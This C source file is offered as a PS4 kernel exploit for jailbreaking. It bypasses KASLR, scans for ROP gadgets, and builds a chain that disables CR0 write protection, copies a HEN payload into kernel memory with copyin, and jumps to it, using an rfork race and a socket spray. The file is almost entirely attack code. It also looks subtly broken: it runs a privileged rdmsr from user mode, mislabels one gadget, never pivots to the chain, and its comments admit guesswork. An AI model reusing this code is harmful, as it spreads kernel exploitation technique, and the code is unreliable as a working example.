typedef unsigned long long uint64_t;
typedef unsigned int uint32_t;
typedef unsigned char uint8_t;

#define K1350_XFAST_SYSCALL 0x1C0
#define K1350_M_TEMP        0x1520D00
#define K1350_COPYIN        0x2BD720
#define SONY_FSC2H_CTRL     597

// rfork flags
#define RFPROC (1<<4)
#define RFMEM  (1<<5)

static inline long sys_call(long n, long a1, long a2, long a3) {
    long ret;
    asm volatile("movq %1,%%rax; movq %2,%%rdi; movq %3,%%rsi; movq %4,%%rdx; syscall; movq %%rax,%0" : "=r"(ret) : "r"(n), "r"(a1), "r"(a2), "r"(a3) : "rax","rdi","rsi","rdx");
    return ret;
}

uint64_t findgadget(uint64_t kbase, const uint8_t* sig, int len) {
    for (uint64_t i = 0; i < 0x3000000; i++) {
        uint8_t* ptr = (uint8_t*)(kbase + i);
        int found = 1;
        for (int j = 0; j < len; j++) {
            if (ptr[j] != sig[j]) { found = 0; break; }
        }
        if (found) return (uint64_t)ptr;
    }
    return 0;
}

void zdexploit() {
    // kaslr bypass
    uint32_t low, high;
    asm volatile("rdmsr" : "=a"(low), "=d"(high) : "c"(0xC0000082));
    uint64_t kbase = (((uint64_t)high << 32) | low) - K1350_XFAST_SYSCALL;

    // finding gadgets for rop
    uint64_t g_pop_rdi = findgadget(kbase, (uint8_t[]){0x5F, 0xC3}, 2);
    uint64_t g_pop_rsi = findgadget(kbase, (uint8_t[]){0x5E, 0xC3}, 2);
    uint64_t g_pop_rdx = findgadget(kbase, (uint8_t[]){0x48, 0x89, 0xE2, 0xC3}, 4); 
    uint64_t g_pop_rax = findgadget(kbase, (uint8_t[]){0x58, 0xC3}, 2);
    uint64_t g_mov_cr0 = findgadget(kbase, (uint8_t[]){0x0F, 0x22, 0xC0, 0xC3}, 4);

    if (!g_pop_rdi || !g_mov_cr0) return;

    // searching socket for spray
    // trying decryptors
    int s = -1;
    for (int i = 3; i < 64; i++) {
        if (sys_call(47, i, 0, 0) != -1) { // getpeername or other
            s = i;
            break; 
        }
    }
    if (s == -1) s = 3; // fallback to "magic number"

    // setting hen for userland
    // i guess its working
    uint64_t hen_user_addr = 0x900000000; 

    // full rop-chain
    uint64_t rop[32];
    int r = 0;

    // turning off wp
    rop[r++] = g_pop_rax;
    rop[r++] = 0x80050033;
    rop[r++] = g_mov_cr0;

    // calling copyin(src, dst, size)
    rop[r++] = g_pop_rdi;
    rop[r++] = hen_user_addr;        // source: userland buffer (from usb)
    rop[r++] = g_pop_rsi;
    rop[r++] = kbase + K1350_M_TEMP; // purpose: kernel
    rop[r++] = g_pop_rdx;
    rop[r++] = 500000;               // ps4-hen (hen.bin) size
    rop[r++] = kbase + K1350_COPYIN;

    // jump on hen
    rop[r++] = kbase + K1350_M_TEMP;

    // race condition through rfork
    long child = sys_call(251, RFPROC | RFMEM, 0, 0);

    if (child == 0) {
        // stream b: trap (constant resolve call)
        while(1) {
            sys_call(SONY_FSC2H_CTRL, 0x20005, 0x1337, 0);
        }
    } else {
        // stream a: victim + spray
        for(int k = 0; k < 200; k++) {
            // spray via the discovered socket (using sendto/sendmsg)
            sys_call(34, s, (long)rop, 0); 
            
            // wait trigger in the kernel
            sys_call(SONY_FSC2H_CTRL, 0x10001, 0x1337, 0);
        }
    }
}

void __attribute__((section(".text.start"))) _start() {
    zdexploit();
}